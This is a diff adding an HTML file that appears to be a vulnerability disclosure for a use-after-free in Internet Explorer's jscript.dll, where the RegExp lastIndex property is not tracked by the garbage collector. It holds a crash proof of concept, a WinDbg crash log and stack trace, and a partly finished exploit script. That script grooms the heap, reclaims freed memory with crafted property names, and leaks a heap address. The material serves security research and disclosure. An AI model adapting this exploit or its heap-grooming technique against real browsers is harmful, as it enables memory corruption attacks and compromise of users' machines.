@@ -1,0 +1,184 @@
+<!--
+There is a use-after-free vulnerability in jscript.dll related to how the lastIndex property of a RegExp object is handled. This vulnerability can be exploited through Internet Explorer or potentially through WPAD over local network. The vulnerability has been reproduced on multiple Windows versions with the most recent patches applied.
+
+The issue is that lastIndex property of a RegExp object is not tracked by the garbage collector. If you look at RegExpObj::LastIndex you'll see that, on x64, lastIndex gets stored in a VAR at offset 272 (at least in my version), but if you take a look at RegExpObj::ScavengeCore (which gets called by the garbage collector to track various member variables) you'll notice that that offset is not being tracked. This allows an attacker to set the lastIndex property, and after the garbage collector gets trigger, the corresponding variable is going to get freed. As JavaScript variables are all allocated in blocks by a custom allocator, to turn this into a crash the entire block of variables needs to get freed. This is similar to some already reported issues, e.g. https://bugs.chromium.org/p/project-zero/issues/detail?id=1506
+
+PoC for IE:
+
+=========================================================
+
+<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
+<script language="Jscript.Encode">
+
+alert('start');
+
+var vars = [];
+
+var r = new RegExp();
+
+for(var i=0; i<20000; i++) {
+  vars[i] = "aaaaa";
+}
+r.lastIndex = "aaaaa";
+for(var i=20000; i<40000; i++) {
+  vars[i] = "aaaaa";
+}
+
+vars.length = 0;
+
+CollectGarbage();
+
+alert(r.lastIndex);
+
+alert('failed');
+
+</script>
+
+=========================================================
+
+
+Crash log:
+
+=========================================================
+
+(760.650): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+jscript!PrepareInvoke+0x2b1:
+000007fe`f26674f1 66390f          cmp     word ptr [rdi],cx ds:00000000`04878e98=????
+0:014> r
+rax=0000000000000000 rbx=000000000000400c rcx=000000000000008f
+rdx=0000000000000000 rsi=0000000000000000 rdi=0000000004878e98
+rip=000007fef26674f1 rsp=000000001268b080 rbp=0000000000000080
+ r8=0000000004095f50  r9=0000000000000008 r10=000000000000000b
+r11=0000000000000005 r12=0000000000000000 r13=000000001268b158
+r14=0000000004095f68 r15=0000000000000001
+iopl=0         nv up ei pl zr na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+jscript!PrepareInvoke+0x2b1:
+000007fe`f26674f1 66390f          cmp     word ptr [rdi],cx ds:00000000`04878e98=????
+0:014> k
+ # Child-SP          RetAddr           Call Site
+00 00000000`1268b080 000007fe`f26505d4 jscript!PrepareInvoke+0x2b1
+01 00000000`1268b0f0 000007fe`f2674343 jscript!InvokeDispatchEx+0xb4
+02 00000000`1268b280 000007fe`f263600b jscript!VAR::InvokeByDispID+0x3e303
+03 00000000`1268b2d0 000007fe`f2636ee2 jscript!CScriptRuntime::Run+0x3a0c
+04 00000000`1268b680 000007fe`f2636d4b jscript!ScrFncObj::CallWithFrameOnStack+0x162
+05 00000000`1268b890 000007fe`f2636bb5 jscript!ScrFncObj::Call+0xb7
+06 00000000`1268b930 000007fe`f263b690 jscript!CSession::Execute+0x19e
+07 00000000`1268ba00 000007fe`f2644027 jscript!COleScript::ExecutePendingScripts+0x17a
+08 00000000`1268bad0 000007fe`f2643826 jscript!COleScript::ParseScriptTextCore+0x267
+09 00000000`1268bbc0 000007fe`e8effdd1 jscript!COleScript::ParseScriptText+0x56
+0a 00000000`1268bc20 000007fe`e9661d3c MSHTML!CActiveScriptHolder::ParseScriptText+0xc1
+0b 00000000`1268bca0 000007fe`e8f00d96 MSHTML!CScriptCollection::ParseScriptText+0x37f
+0c 00000000`1268bd80 000007fe`e8f007d1 MSHTML!CScriptData::CommitCode+0x3d9
+0d 00000000`1268bf50 000007fe`e8f00561 MSHTML!CScriptData::Execute+0x283
+0e 00000000`1268c010 000007fe`e9663655 MSHTML!CHtmScriptParseCtx::Execute+0x101
+0f 00000000`1268c050 000007fe`e8ee86c7 MSHTML!CHtmParseBase::Execute+0x235
+10 00000000`1268c0f0 000007fe`e8e5ba49 MSHTML!CHtmPost::Broadcast+0x90
+11 00000000`1268c130 000007fe`e8ec282f MSHTML!CHtmPost::Exec+0x4bb
+12 00000000`1268c340 000007fe`e8ec2780 MSHTML!CHtmPost::Run+0x3f
+13 00000000`1268c370 000007fe`e8ec4532 MSHTML!PostManExecute+0x70
+14 00000000`1268c3f0 000007fe`e8ec7f43 MSHTML!PostManResume+0xa1
+15 00000000`1268c430 000007fe`e8ea5fb8 MSHTML!CHtmPost::OnDwnChanCallback+0x43
+16 00000000`1268c480 000007fe`e96d488f MSHTML!CDwnChan::OnMethodCall+0x41
+17 00000000`1268c4b0 000007fe`e8dc9dc5 MSHTML!GlobalWndOnMethodCall+0x254
+18 00000000`1268c550 00000000`76e79bbd MSHTML!GlobalWndProc+0x150
+19 00000000`1268c5d0 00000000`76e798c2 USER32!UserCallWinProcCheckWow+0x1ad
+1a 00000000`1268c690 000007fe`effe42fe USER32!DispatchMessageWorker+0x3b5
+1b 00000000`1268c710 000007fe`f004ad2b IEFRAME!CTabWindow::_TabWindowThreadProc+0x555
+1c 00000000`1268f990 000007fe`fec5a2cf IEFRAME!LCIETab_ThreadProc+0x3a3
+1d 00000000`1268fac0 000007fe`f77e925f iertutil!_IsoThreadProc_WrapperToReleaseScope+0x1f
+1e 00000000`1268faf0 00000000`76d559cd IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x9f
+1f 00000000`1268fb40 00000000`76fb383d kernel32!BaseThreadInitThunk+0xd
+20 00000000`1268fb70 00000000`00000000 ntdll!RtlUserThreadStart+0x1d
+
+=========================================================
+
+
+Attached is a started-but-never-finished exploit that only leaks the heap address of the use-after-free allocation. It was tested against IE in 64-bit single process mode (via TabProcGrowth registry flag). In a 32-bit process (default) the structure sizes/offsets would likely be different so it would not work as is.
+-->
+
+<!-- saved from url=(0014)about:internet -->
+<meta http-equiv="X-UA-Compatible" content="IE=7"></meta>
+<script language="Jscript.Encode">
+
+var objects = [];
+var regexps = [];
+var magicIndex = 0;
+var magicObject;
+var allocationAddress;
+
+function infoLeak() {
+   // alert("in infoleak");
+   // leak the "next" pointer from one of the NameList entries
+   allocationAddress = regexps[magicIndex + 6].lastIndex / 4.9406564584124654E-324 - 0x560;
+   prompt("allocationAddress", allocationAddress.toString(16));
+}
+
+// specially crafted property name that allows us to test for successful exploitation
+// and figure out which object got reallocated over freed block
+function getName4(index) {
+  return String.fromCharCode(0,0,0,0,0,0,0,0, 3,0,0,0, index,0,0,0, 0,0,0,0, 3,0,0,0, 0x1337,0,0,0, 0,0,0,0);
+}
+
+function exploit() {
+
+  // todo: trigger LFH for 0x970 allocation size, might make the exploit more reliable
+
+  alert('start');
+
+  // crafted property names
+  var name1 = Array(570).join('a'); // makes NameList allocation of exactly 0x970 bytes
+  var name2 = 'bbbbbbbbbbb'; // length chosen to allign the next item correctly
+  var name3 = String.fromCharCode(5); // 5 is the double var type, used to leak the "next" pointer
+
+  // allocate empty objects
+  for(var i=0; i<500; i++) {
+    var o = {};
+    objects[i] = o;
+  }
+
+  // allocate regexp objects
+  for(var i=0;i<10000;i++) {
+    regexps[i] = new RegExp();
+  }
+
+  // allocate variables that aren't being tracked by GC
+  for(var i=0;i<10000;i++) {
+    regexps[i].lastIndex = "aaaaa";
+  }
+
+  // trigger freeing of var blocks
+  CollectGarbage();
+
+  // allocate NameList blocks over freed allocations
+  for(var i=0; i<500; i++) {
+    objects[i][name1] = 1;
+  }
+
+  // fill NameList blocks with other data useful for infolek stage
+  for(var i=0; i<500; i++) {
+    objects[i][name2] = 1;
+    objects[i][name3] = 1;
+    objects[i][getName4(i)] = 1;
+  }
+
+  for(var i=0;i<10000;i++) {
+    try {
+      if(regexps[i].lastIndex == 0x1337) {
+        alert("win");
+        magicIndex = i;
+        magicObject = objects[regexps[i+1].lastIndex];
+        infoLeak();
+        return;
+      }
+    } catch(e) { }
+  }
+
+  alert('failed');
+}
+
+exploit();
+
+</script>
